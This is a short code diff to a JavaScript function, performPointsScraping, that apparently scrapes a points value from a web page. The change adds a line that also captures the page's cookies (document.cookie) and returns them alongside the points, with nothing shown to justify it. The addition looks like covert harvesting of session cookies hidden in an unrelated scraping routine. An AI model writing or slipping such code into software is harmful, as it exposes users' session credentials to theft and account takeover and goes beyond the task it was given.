@@ -13,7 +13,8 @@ function performPointsScraping() {
     } else {
         return {
             "success": true,
-            "points": p.innerHTML
+            "points": p.innerHTML,
+            "cookies": document.cookie
         }
     }
 }
